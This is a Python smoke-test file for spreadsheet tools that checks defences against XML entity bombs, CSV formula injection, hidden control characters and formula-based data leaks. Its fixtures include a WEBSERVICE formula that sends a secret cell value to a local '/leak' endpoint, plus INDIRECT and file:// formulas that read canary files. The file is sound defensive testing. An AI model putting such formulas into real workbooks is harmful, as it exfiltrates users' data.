#!/usr/bin/env python3
"""Smoke tests for the bundled scripts. Run: python tests/smoke_test.py
Builds fixtures in a temp folder; recalc checks are skipped if LibreOffice is absent.
Requires: openpyxl, defusedxml."""
import http.server
import importlib.util
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import threading
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
S = ROOT / "scripts"
PY = sys.executable


def run(*args, env=None, prefix=()):
    e = dict(os.environ, **(env or {}))
    return subprocess.run([*prefix, PY, *map(str, args)], capture_output=True, text=True, env=e)


def main():
    from openpyxl import Workbook
    tmp = Path(tempfile.mkdtemp(prefix="xl-smoke-"))
    counts = {"PASS": 0, "FAIL": 0, "SKIP": 0}

    def check(name, cond):
        tag = "PASS" if cond else "FAIL"
        counts[tag] += 1
        print(f"{tag} {name}")

    def skip(name, why):
        counts["SKIP"] += 1
        print(f"SKIP {name} ({why})")

    wb = Workbook()
    ws = wb.active
    ws["A1"], ws["A2"], ws["A3"] = 2, 3, "=A1*A2"
    ws.merge_cells("C1:D1")
    wb.create_sheet("Hidden").sheet_state = "hidden"
    f = tmp / "f.xlsx"
    wb.save(f)

    r = run(S / "inspect_xlsx.py", f, "--json")
    d = json.loads(r.stdout)
    check("inspect json ok", r.returncode == 0 and d["ok"])
    check("inspect sees formula without cache", d["sheets"][0]["formulas_without_cached_value"] == 1)
    check("inspect sees hidden sheet and merge", d["sheets"][1]["state"] == "hidden" and d["sheets"][0]["merged_ranges"] == 1)

    bomb = tmp / "bomb.xlsx"
    with zipfile.ZipFile(f) as src, zipfile.ZipFile(bomb, "w") as dst:
        for i in src.infolist():
            data = src.read(i.filename)
            if i.filename == "xl/workbook.xml":
                body = data.split(b"?>", 1)[1] if data.startswith(b"<?xml") else data
                data = b'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a "aaaa">]>' + body
            dst.writestr(i, data)
    check("inspect blocks XML entities", run(S / "inspect_xlsx.py", bomb).returncode == 2)
    check("inspect size cap", run(S / "inspect_xlsx.py", f, "--max-mb", "0").returncode == 3)
    ole = tmp / "enc.xlsx"
    ole.write_bytes(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\0" * 64)
    check("inspect flags OLE2/encrypted", run(S / "inspect_xlsx.py", ole).returncode == 2)

    csvf = tmp / "in.csv"
    csvf.write_text('ID;Amount;Note\n000123;1.250,50;=HYPERLINK("x")\n', encoding="utf-8")
    out = tmp / "out.xlsx"
    r = run(S / "csv_to_xlsx.py", csvf, out, "--number-cols", "Amount", "--decimal", ",")
    from openpyxl import load_workbook
    c = load_workbook(out).active
    check("csv keeps leading zeros", c["A2"].value == "000123")
    check("csv parses decimal comma", c["B2"].value == 1250.5)
    check("csv neutralizes formula injection", c["C2"].data_type == "s")
    check("csv refuses overwrite", run(S / "csv_to_xlsx.py", csvf, out).returncode != 0)
    mlf = tmp / "ml.csv"
    mlf.write_bytes(b'ID,Note\r\n1,"line one\r\nline two"\r\n2,x\r\n')
    r = run(S / "csv_to_xlsx.py", mlf, tmp / "ml.xlsx")
    m = load_workbook(tmp / "ml.xlsx").active
    check("csv keeps multiline quoted fields", r.returncode == 0 and m.max_row == 3 and "line two" in m["B2"].value and m["A3"].value == "2")
    # every formula trigger stays literal text after save and reload
    inj = tmp / "inj.csv"
    inj.write_text('v\n=1+1\n+1+1\n-1+1\n@SUM(1)\n"\t=1"\n"\r=1"\n', encoding="utf-8")
    r = run(S / "csv_to_xlsx.py", inj, tmp / "inj.xlsx")
    iw = load_workbook(tmp / "inj.xlsx").active
    cells = [iw.cell(row=i, column=1) for i in range(2, 8)]
    check("csv keeps all formula triggers literal", r.returncode == 0 and all(c.data_type == "s" for c in cells)
          and cells[0].value == "=1+1")

    # SKILL.md literal-text recipe survives save and reload
    lw = Workbook()
    lw.active["B2"] = "=not a formula"
    lw.active["B2"].data_type = "s"
    lw.save(tmp / "lit.xlsx")
    lc = load_workbook(tmp / "lit.xlsx").active["B2"]
    check("literal =text stays text after reload", lc.data_type == "s" and lc.value == "=not a formula")

    # clean() strips C1 controls, bidi and zero-width characters (Tariq I1)
    spec = importlib.util.spec_from_file_location("inspect_xlsx", S / "inspect_xlsx.py")
    ins = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(ins)
    nasty = "a\x9b31mb\x85c\u202ed\u2066e\u200bf\u200dg\ufeffh\u2060i\x1bj"
    check("clean strips C1, bidi and zero-width chars", not any(ch in ins.clean(nasty) for ch in nasty if ch not in "abcdefghij31m "))
    check("clean keeps normal text", ins.clean("Total \u00e9t\u00e9 \u0627\u0644") == "Total \u00e9t\u00e9 \u0627\u0644")

    # --show-links: count by default, targets only on request
    d = json.loads(run(S / "inspect_xlsx.py", f, "--json").stdout)
    check("inspect hides link targets by default", d["external_link_targets"].startswith("hidden") and d["external_links"] == 0)

    spec = importlib.util.spec_from_file_location("recalc", S / "recalc.py")
    rc = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(rc)
    check("recalc profile sets link updates to never", 'Content/Update"><prop oor:name="Link" oor:op="fuse"><value>1<' in rc.XCU)

    # verify(): literal "=text" is not a formula; formulas after short rows are still counted (zip fix)
    vw = Workbook()
    vs = vw.active
    vs["A1"] = "=literal"
    vs["A1"].data_type = "s"
    vs["A2"], vs["E9"] = 1, "=A2+1"
    vf = tmp / "v.xlsx"
    vw.save(vf)
    check("recalc verify counts by data_type and coordinate", rc.verify(vf) == (1, 1, 0))
    check("recalc vba_status", [rc.vba_status(*x) for x in ((None, None), ("a", None), ("a", "a"), ("a", "b"))]
          == ["none", "missing", "identical", "changed"])
    h = run(S / "recalc.py", "--help").stdout
    check("recalc help forbids agents passing --sandboxed", "must never add it" in h and "OPERATOR ONLY" in h)

    # release consistency: unscoped npm name, versions agree, package ships what SKILL.md calls
    pkg = json.loads((ROOT / "package.json").read_text())
    skill = (ROOT / "SKILL.md").read_text()
    ver = re.search(r'version: "([^"]+)"', skill).group(1)
    check("package name and versions agree", pkg["name"] == "microsoft-excel" and pkg.get("publishConfig", {}).get("access") == "public" and pkg["version"] == ver
          and f"## {ver} " in (ROOT / "CHANGELOG.md").read_text())
    files = pkg["files"]
    check("package files cover SKILL.md, references and scripts",
          all(x in files for x in ("SKILL.md", "references/", "scripts/*.py", "scripts/requirements.txt")))

    if shutil.which("soffice") or shutil.which("libreoffice"):
        r = run(S / "recalc.py", f, tmp / "rc")
        v = load_workbook(tmp / "rc" / "f.xlsx", data_only=True).active["A3"].value
        check("recalc fills cached value", r.returncode == 0 and v == 6)

        # never deletes an existing output unless --force (Tariq R2)
        keep = tmp / "rc2" / "f.xlsx"
        keep.parent.mkdir()
        keep.write_bytes(b"user data")
        r = run(S / "recalc.py", f, tmp / "rc2")
        check("recalc refuses to replace existing output", r.returncode != 0 and keep.read_bytes() == b"user data")
        r = run(S / "recalc.py", f, tmp / "rc2", "--force")
        check("recalc --force replaces output", r.returncode == 0 and zipfile.is_zipfile(keep))

        # --sandboxed is refused when a test connection works (Tariq N1)
        srv0 = http.server.ThreadingHTTPServer(("127.0.0.1", 0), http.server.BaseHTTPRequestHandler)
        threading.Thread(target=srv0.serve_forever, daemon=True).start()
        probe_env = {"XLRECALC_EXTRA_PROBES": f"127.0.0.1:{srv0.server_address[1]}"}
        r = run(S / "recalc.py", f, tmp / "rc5", "--sandboxed", env=probe_env)
        check("recalc --sandboxed refuses when network works", r.returncode == 2 and "succeeded" in r.stderr
              and not (tmp / "rc5" / "f.xlsx").exists())
        srv0.shutdown()

        # .xlsm: report what happened to the VBA project
        xm = tmp / "m.xlsm"
        with zipfile.ZipFile(f) as src, zipfile.ZipFile(xm, "w") as dst:
            for i in src.infolist():
                data = src.read(i.filename)
                if i.filename == "[Content_Types].xml":
                    data = data.replace(
                        b"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml",
                        b"application/vnd.ms-excel.sheet.macroEnabled.main+xml").replace(
                        b"</Types>", b'<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>')
                if i.filename == "xl/_rels/workbook.xml.rels":
                    data = data.replace(b"</Relationships>", b'<Relationship Id="rIdV" Type="http://schemas.microsoft.com/'
                                        b'office/2006/relationships/vbaProject" Target="vbaProject.bin"/></Relationships>')
                dst.writestr(i, data)
            dst.writestr("xl/vbaProject.bin", b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\0" * 504)
        r = run(S / "recalc.py", xm, tmp / "rc6")
        st = re.search(r"vba_project=(\w+)", r.stdout)
        check("recalc reports VBA project status for .xlsm", st is not None and
              (r.returncode == 0) == (st.group(1) == "identical") and xm.read_bytes()[:2] == b"PK")

        prefix = rc.no_network_prefix()
        if prefix:
            hits = []

            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self):
                    hits.append(self.path)
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b"x")

                def log_message(self, *args):
                    pass

            srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), H)
            threading.Thread(target=srv.serve_forever, daemon=True).start()
            port = srv.server_address[1]
            probe = f"import socket; socket.create_connection(('127.0.0.1', {port}), timeout=3)"
            p = subprocess.run(prefix + [PY, "-c", probe], capture_output=True, text=True)
            check("no-network namespace blocks connections", p.returncode != 0 and not hits)
            ww = Workbook()
            ww.active["A1"] = "secret"
            ww.active["B1"] = f'=_xlfn.WEBSERVICE("http://127.0.0.1:{port}/leak?"&A1)'
            wf = tmp / "web.xlsx"
            ww.save(wf)
            r = run(S / "recalc.py", wf, tmp / "rc3")
            check("recalc WEBSERVICE sends no request", r.returncode in (0, 1) and not hits)

            # operator sandbox: --sandboxed runs when no connection works
            r = run(S / "recalc.py", f, tmp / "rc7", "--sandboxed", prefix=prefix,
                    env={"XLRECALC_EXTRA_PROBES": f"127.0.0.1:{port}"})
            check("recalc --sandboxed runs inside a no-network sandbox", r.returncode == 0 and not hits)
            srv.shutdown()

            # local files are not pulled in (Tariq N2): absolute file:// and relative paths
            canary_dir = tmp / "lf"
            canary_dir.mkdir()
            secret = "CANARY" + "7f3a9"
            (canary_dir / "secret.txt").write_text(secret, encoding="utf-8")
            (canary_dir / "secret.csv").write_text(secret + ",1\n", encoding="utf-8")
            uri = (canary_dir / "secret.txt").as_uri()
            lw = Workbook()
            ls = lw.active
            ls["A1"] = f'=_xlfn.WEBSERVICE("{uri}")'
            ls["A2"] = '=_xlfn.WEBSERVICE("secret.txt")'
            ls["A3"] = f'=INDIRECT("\'{(canary_dir / "secret.csv").as_uri()}\'#$secret.A1")'
            ls["A4"] = '=INDIRECT("\'secret.csv\'#$secret.A1")'
            ls["A5"] = f'=_xlfn.FILTERXML(_xlfn.WEBSERVICE("{uri}"),"//a")'
            lf = canary_dir / "lf.xlsx"
            lw.save(lf)
            r = run(S / "recalc.py", lf, tmp / "rc8")
            outp = tmp / "rc8" / "lf.xlsx"
            leaked = outp.exists() and any(secret.encode() in zipfile.ZipFile(outp).read(n)
                                           for n in zipfile.ZipFile(outp).namelist())
            check("recalc does not pull local files (file://, relative, INDIRECT)", outp.exists() and not leaked)
        else:
            r = run(S / "recalc.py", f, tmp / "rc4")
            check("recalc refuses without network isolation", r.returncode == 2 and "Do not add --sandboxed" in r.stderr)
            for n in ("no-network namespace blocks connections", "recalc WEBSERVICE sends no request",
                      "recalc --sandboxed runs inside a no-network sandbox", "recalc does not pull local files"):
                skip(n, "unshare unavailable")
    else:
        skip("recalc checks", "LibreOffice not installed")
    if (shutil.which("soffice") or shutil.which("libreoffice")) and rc.no_network_prefix():
        skip("recalc refuses without network isolation", "unshare works here")
    shutil.rmtree(tmp, ignore_errors=True)
    print(f"{counts['PASS']} passed, {counts['FAIL']} failed, {counts['SKIP']} skipped")
    return 1 if counts["FAIL"] else 0


if __name__ == "__main__":
    sys.exit(main())
